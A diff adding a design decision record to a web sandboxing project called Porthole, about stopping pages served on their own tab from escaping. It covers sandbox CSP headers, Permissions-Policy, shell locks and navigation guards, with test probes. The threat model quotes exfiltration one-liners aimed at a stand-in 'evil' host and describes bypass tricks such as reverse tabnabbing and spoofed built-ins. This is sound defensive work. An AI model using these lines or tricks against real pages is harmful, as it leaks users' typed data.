@@ -4370,3 +4370,222 @@ aren't offered.
 **Revisit when** MCP Apps says how hosts show or attribute context updates (follow it, and link
 the issue); a host needs image blocks (show them, then offer `image`); or a host's composer is the
 common surface (the React binding could offer a chip there).
+
+## P099 · 2026-10-19 · A served page carries its frame's sandbox in its own CSP; on a tab the shell opens no window · Accepted
+
+The 2026-10-19 review of value and scenarios, S4 and its first P0 (baseline 264b12f): a served
+page opened on a tab of its own (a public link, "open in a new tab", a bookmark, a frame's address
+opened outside it) had no sandbox. Its CSP had no `sandbox` directive, a tab has no frame
+attribute, and the shell left `window.open` alone, so after a visitor's click the page could send
+what they typed out in a window's address (`window.open("https://evil/?" + input)`), past
+`connect-src` and `form-action`; it could also navigate the page that opened it (reverse
+tabnabbing) and open a picture-in-picture document (Chromium, Firefox), a window of its origin in a
+fresh realm where the shell never ran (measured: `RTCPeerConnection` there, and `window.open`).
+P082 noted "on a tab (no sandbox there)" only between versions.
+
+**Failing first.** At a92adac with only the new probes (`leak/served/tab.spec.ts`), 14 of 18
+failed: `served.domain.tab-window-open` on all three engines (`window.open` gave a window, the
+canary heard it), `.tab-opener` on all three (the opener was sent to the canary), the sealed address
+opened on a tab on all three (`window.open`; the link too on Chromium and Firefox), the file set's
+page on all three, `.tab-escapes` on Firefox (the link reached the canary) and Chromium (the click
+never settled), not on WebKit (Playwright's WebKit opened no window from a nested link click and
+started no download; the case then had no `prompt`, which now fails there too). `.tab-navigation`
+held on all three: the shell's guard (P079) already stops a tab navigating itself. With both new
+walls taken out again (`tab-sandbox,window-open`), the cases as committed fail 15 of 18, every case
+but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictureInPicture
+.requestWindow()` opened a window on Chromium and Firefox with `RTCPeerConnection` in it and
+`window.open` working (WebKit has no such API).
+
+**Decision.**
+1. **Every served page sends its frame's sandbox in its CSP header**, on every request:
+   `servedSandboxDirective(config)` is `sandbox` with the frame's own tokens (`sandboxTokens`),
+   `sandbox allow-scripts allow-same-origin` for domain isolation, appended by `servedDocumentCsp`
+   wherever `/server` writes a page's header: a shell, an artifact page, the MCP Apps sandbox
+   proxy, a file set's page at its clean address or its sealed one. Not a script (a worker's
+   policy is its script's; no window there), not another file (already `sandbox`, P081), not
+   Porthole's own status pages, not a url-mode app's documents.
+   - *On every request, not only `Sec-Fetch-Dest: document`* (the review's wording): in a frame the
+     header's flags and the attribute's are the same, so nothing changes there; keyed on fetch
+     metadata, a client that sends none (an older browser, an extension or proxy that strips it)
+     would get an unsandboxed tab, and one address would have two answers to keep apart in caches.
+   - *What it closes on a tab*: new windows (`window.open`, target=_blank links and forms), form
+     submission (`form-action 'none'` was already a wall), downloads (where the engine honors
+     `allow-downloads`), browser dialogs (`prompt` asks a visitor for anything, under the content
+     origin's name; frames never had them), navigation of any other window (its opener's:
+     the sandboxed navigation flag), pointer lock, presentation.
+   - *What it can't close*: the page navigating itself. A sandboxed document may always navigate
+     itself (HTML, "allowed by sandboxing to navigate": the source is the target), top-level too,
+     and no CSP governs it (`navigate-to` was dropped). The shell's guard (P079) is that wall on a
+     tab, as in a served frame (`served.domain.tab-navigation`, `served.domain.self-navigation`:
+     the guard, unchanged here, holds both; `navigate-guard` fails both).
+   - *Accepted limit: an engine without the Navigation API.* There the guard gets no events, and
+     a page on a tab can navigate itself away with data in the address (`location =
+     "https://evil/?" + input`): P079's fallback is the embedding page's `frame-src`, and a tab has
+     no embedding page. The engines Porthole gates on (Chromium 153, WebKit 26.6, Firefox 155)
+     have the API; older Safari and Firefox releases don't. There it can also go to a `blob:`
+     document it wrote itself, of its own origin, where the shell never runs: its CSP carries
+     over (HTML's policy container: the sandbox and `connect-src` with it), its
+     `Permissions-Policy` doesn't, and none of
+     the shell's walls are there. Measured with the guard out (`navigate-guard`), on all three
+     engines: `RTCPeerConnection` there (a peer connection reaches the network outside
+     `connect-src` where an engine ignores `webrtc 'block'`), location granted, the camera
+     asked for (refused only for want of a device). No CSP directive closes it: none governs a
+     document's own navigation (`frame-src` is a frame's, and a tab has none), and the page's
+     `script-src` must keep `'unsafe-inline'` and `blob:`, which such a document inherits.
+     `served.domain.tab-navigation` probes both (an outside site and a `blob:` document; the
+     guard holds each on all three engines). Accepted: nothing else in a page can stop its own
+     navigation (`Location` can't be wrapped), and a host that must cover such browsers shows
+     public pages in its own frame, where `frame-src` holds (`blob:` is never in it).
+2. **`allow-same-origin`: needed, and safe there.**
+   - *Needed*: without it the page is an opaque origin. Its own files' requests are then
+     cross-site, so a tab's `SameSite=Lax` session cookie isn't sent and every file is refused; its
+     module scripts are CORS requests from `Origin: null`, which Porthole answers without CORS; CORP
+     `same-origin` refuses its files and `/_blob/` assets to it; the sealed address's renewal and
+     its loads after the first hour need `Sec-Fetch-Site: same-origin` (P083); and its scope's
+     storage (`served.domain.storage-scope`) is gone. The frame already runs with it.
+   - *Safe*: the origin is the scope's own label on the content domain, a separate site from the
+     host's (P047; `ContentDomainError` and the mount refuse otherwise). The danger of
+     `allow-scripts` with `allow-same-origin` is a document lifting its own sandbox through a
+     same-origin parent that holds the attribute; a CSP sandbox is a response header content
+     can't change, and a tab has no parent. What the origin gives the page is what its frame has
+     (its scope's storage, its own files); no other document's window is reachable from it (no
+     popups, no frames: `frame-src 'none'` and the shell's frame guard; no navigation of another
+     window; `openInTab` cuts the tab's opener itself). A sibling label stays another origin
+     (P047's same-site caveat unchanged).
+3. **Every served page denies itself what its frame's `allow` doesn't grant**, in a
+   `Permissions-Policy` header (`servedPermissionsPolicy`): each feature of `FRAME_DENIED_FEATURES`
+   (the camera, the microphone, the screen, location, full screen, the clipboard, payment, USB,
+   serial, HID, Bluetooth, MIDI, sensors, credentials, web share, autoplay, wake lock and the
+   rest whose default allowlist is `'self'`) `=()`, less what `delegatedFeatures` says the frame's
+   `allow` grants (nothing, outside url mode). In a frame it changes nothing: a cross-origin
+   frame has none of these unless its `allow` names them, and a frame's features are the
+   intersection of the two; `*`-default features (a video's picture-in-picture) are left out for
+   that reason. On a tab it is the only denial. The agreement test holds the header to the
+   frame's `allow` for every preset. Only Chromium applies it here (measured with the shell's
+   locks out, `device-locks`: WebKit and Firefox gave a tab location the browser had granted), so
+   the shell, on a tab only, also refuses `getUserMedia`, `getDisplayMedia`, `getCurrentPosition`, `watchPosition`
+   and `requestFullscreen` as a denial does, at once, without a prompt: the manual's "camera,
+   microphone, location denied without asking" and "full screen closed" now hold on a tab too.
+   After the independent review of a32f5b2, likewise passkeys and saved passwords
+   (`navigator.credentials.create`, `get`, `store`), the share sheet (`navigator.share`;
+   `canShare` says no), payments (`PaymentRequest` throws `SecurityError`, as the header makes it:
+   a payment method's address is fetched by the browser, outside the CSP) and WebKit's video full
+   screen (`webkitEnterFullscreen`). `served.domain.tab-prompts` asks for each where the engine
+   has it, after a click: each refused at once (a prompt waits for the person, up to the request's
+   timeout), the payment method's address never fetched. With the shell's locks out
+   (`device-locks`) it fails on Firefox (a passkey request waited); with the header out too, on
+   Chromium as well; WebKit refused each at once either way here (no share sheet on desktop, no
+   authenticator to ask).
+   *The list* is held to Chromium's own (`permissions_policy_features.json5`, checked in as
+   `test/reference/permissions-policy-features.json`, read 2026-10-20): every feature a web page
+   has whose default allowlist is `'self'` is denied, but client hints, `cross-origin-isolated`
+   and Chromium's sample, each kept with its reason in `test/permissions-policy.test.ts`, which
+   fails on a refreshed reference until a new feature is classified. The review's eight names
+   (`digital-credentials-get`, `captured-surface-control`, `deferred-fetch`, `keyboard-map`,
+   `compute-pressure`, `summarizer`, `translator`, `language-detector`) are all there, with 18
+   more (the other built-in models, `webnn`, WebMCP's `tools`, local network access, `autofill`,
+   `digital-credentials-create`, `web-app-installation`, …). An engine logs each name it doesn't
+   know (measured: Playwright's Chromium 153 names `ambient-light-sensor`, `autofill`, `bluetooth`
+   and more) and ignores it; a name it learns later is denied from that day.
+4. **The shell, on a tab** (`window.top === window`): `window.open` answers null (a `_self`
+   target stays a navigation of the document, which the guard decides), and
+   `DocumentPictureInPicture.prototype.requestWindow` rejects, both fixed in place. For
+   `window.open` the second wall, behind the sandbox, for an edge that drops or rewrites the
+   header; for picture-in-picture also the second: with the shell's locks out (`window-open`), the
+   sandbox refuses it, on Chromium (`InvalidStateError`) and Firefox (`UnknownError`, no window
+   made). In a frame the frame's sandbox stays the wall, and
+   row 6's `sandbox` control still fails `6.open`.
+   *`navigation.navigate()` asks first, in every shell.* WebKit sends its request though the
+   navigate event cancels the navigation (measured on a tab: the canary heard an outside site
+   while the page stayed and the call rejected with `AbortError`; `location.href` sent nothing,
+   and a `blob:` target, which has no request, stayed too; live.spec.ts had seen WebKit start it
+   in a frame without the event first). So the shell wraps `Navigation.prototype.navigate`, and a
+   tab's `open(…, "_self")`, with the guard's own rule (`mayNavigate`: the same address, a
+   fragment, or another page of the set, P084, go on; anything else is stopped before any request,
+   answered as an aborted navigation, and told to the host as the guard tells it).
+   After the next review: the address is read once (`String()` and resolved there) and the call is
+   given that address, absolute, so an object whose `toString` names a page of its own the first
+   time and an outside site the next can't pass the rule and then go elsewhere (it did on WebKit:
+   the canary heard it). The rule reads through the platform's own functions, kept at the start
+   (`String`, `URL`, the `href` getter, `String.prototype`'s `indexOf`, `slice`, `lastIndexOf`,
+   `toLowerCase`; `ownPage` too, which the guard and P084's links share, and the renewal's check
+   of a sealed base), so a page that replaces them can't make an outside address look like its
+   own. And a link that would navigate a tab (no target, `_self`, `_top`, `_parent`) asks the same
+   rule from the first click listener there is (the shell's, on `window`, capturing, reading the
+   event's target, `closest` and `getAttribute` through the platform's own), before content can
+   step past the shell's own link handling: WebKit sent a link's request though the navigate event
+   cancelled it. Measured on WebKit, each way from a tab of its own: `location.href`,
+   `location.assign`, `location.replace` and `open(…, "_self")` sent nothing (the navigate event
+   stops them before any request); a link and `navigation.navigate()` did, until the rule asked
+   first. At 6cbaeb8 the canary heard a link, a two-faced `navigate()`, and both with the
+   built-ins lying; now none, on any engine. `served.domain.tab-navigation` tries each way
+   (`location`, `assign`, `replace`, a link past the shell, `navigate()`, `open(…, "_self")`, both
+   two-faced, and a link and `navigate()` with the built-ins lying) toward a `blob:` document of
+   its own and an outside site, each in a fresh tab (WebKit sent such a request from a tab's first
+   attempt and not always after); the `navigate-ask` control (the rule says yes to everything)
+   fails it on WebKit only, as measured, and `navigate-guard` now takes both out.
+   *A tab's links are followed by the shell* (after the next review). Checking a link in the
+   first listener wasn't enough: the browser follows a link with the `href` and `target` it has
+   once every listener ran, so a listener after the shell's could change them (a page's own
+   address to an outside one, `_blank` to `_self`, an `href` added, a `download` dropped), and a
+   link in a shadow root wasn't seen at all (at `window` the event's target is the host). Now the
+   shell's first click listener takes every plain click on a link, found through the event's
+   composed path, from the browser: it cancels it (through the platform's own `preventDefault`),
+   reads `href`, `target` and `download` once, and after every listener ran (a task later), unless
+   content cancelled the click itself (`preventDefault` and `returnValue` are wrapped on a tab to
+   say so; an inline handler's `return false` isn't seen), follows what it read with a detached
+   link of its own, which no listener of content's sees, where the rule lets it: the same document
+   (a fragment jumps), another page of the set (P084), a download of the page's own (same origin,
+   `blob:`, `data:`; the sandbox then refuses it, as before). A link to a new window does nothing
+   (the sandbox refuses it anyway); a modified or middle click is left to the browser (a window or
+   a download, both refused by the sandbox). On a tab a closed shadow root is made open to the
+   platform and kept closed to content (its host's `shadowRoot` is null, its `mode` "closed"),
+   so its links are in the composed path too. `served.domain.tab-links` tries each (an `href`
+   switched, a `target` switched, an `href` added, a `download` dropped, by a listener after the
+   shell's that also stops the rest; a link in an open and in a closed shadow root, every listener
+   after the shell's stopped), each from a fresh tab, and checks a fragment link still jumps and a
+   link content cancels goes nowhere. At e26dff6 WebKit's canary heard five of the six (an `href`
+   switched, a `target` switched, an `href` added, both shadow roots); now none, on any engine.
+   The `link-rule` control (the browser follows links again) fails `.tab-links` and
+   `.tab-navigation` on WebKit only.
+   *A lock that doesn't take.* `lock` fixes each wall with a non-configurable property; one that
+   something fixed before the shell ran (an extension, an engine's own) can't be, and was
+   swallowed. Now each such name goes on the shell's own script element
+   (`data-porthole-unfixed`) and, once the shell can speak, to the host as an error report. The
+   tab case "the shell fixes each of its walls in place" finds none in a frame or on a tab on any
+   engine, and names `RTCPeerConnection` where a script fixed it first. WebKit's `ApplePaySession` is locked
+   with the other payments (absent in Playwright's WebKit on Linux: `.tab-prompts` asks where it
+   is).
+5. **Probes**, in the served conformance suite (shipped: `defineHostConformance` runs them against
+   an app's real page and edge): `served.domain.tab-window-open`, `.tab-escapes`, `.tab-opener`,
+   `.tab-navigation` (an outside site, then a `blob:` document of its own), `.tab-devices`
+   (location, camera and microphone, with the browser's
+   permission granted, and full screen after a click: each refused) (`TAB_CASES`, one per wall),
+   and `served.domain.self-navigation` (a served
+   frame sends itself to an outside site, which the embedding page's `frame-src` stops, and to
+   another content origin, which only the guard does: the served suite had no self-navigation
+   probe; the leak suite's ran in opaque frames only). Porthole's own (`leak/served/tab.spec.ts`):
+   the four against the reference serving, a file set's page on a tab (its module, its fetch and
+   its links to its own pages work; nothing else opens), and a frame's sealed address opened on a
+   tab. Negative controls (P032): `tab-sandbox` (the harness drops the header's `sandbox`),
+   `window-open` (the shell's window locks on a tab taken out), `permissions-policy` (the harness
+   drops the header) and `device-locks` (the shell's device locks taken out), in
+   `scripts/controls.ts`.
+6. **Checked unchanged**: the url-mode relay (`fromUpstream` adds `frame-ancestors` only;
+   `served.url.tab`); redirect entry and the handoff (redirects and Porthole's pages, never
+   content's: `files.spec.ts` on a tab, the kit's entry cases); a frame's sealed address (the same
+   flags; `files.spec.ts` in a frame on WebKit, its renewal); a set's pages opening each other
+   (P084, on a tab now too); the runtime's `artifact`, `user`, `db` (in a frame the same flags; on
+   a tab there is no host, and `use` resolves null at once, as before).
+**Rejected.** Keying the sandbox on `Sec-Fetch-Dest` (above). An opaque origin on a tab (above).
+The shell's lock alone (the review's minimum): a script can't undo it, but it leaves links and
+forms aimed at new windows clicked past the shell's handler, downloads, dialogs and the opener.
+`Cross-Origin-Opener-Policy` on served pages, to cut the opener: the sandbox already refuses its
+navigation, and COOP changes how a host's own tab handling sees the page; not needed for this.
+A sandbox on a url-mode app's tab: the app is code the host trusts to its origin's reach (P020,
+P037), and needs what it would take away (sign-in popups, form posts, downloads).
+**Revisit when** an engine lets a CSP govern a document's own navigation (the guard would get a
+second wall on a tab); a host needs a served page to open windows from a tab (through the host,
+`links.open`/`openLink`, never `allow-popups`); the platform adds a powerful feature with a
+`'self'` default (it joins `FRAME_DENIED_FEATURES`); or WebKit and Firefox apply
+`Permissions-Policy` to these features (the shell's device locks become the second wall there too).
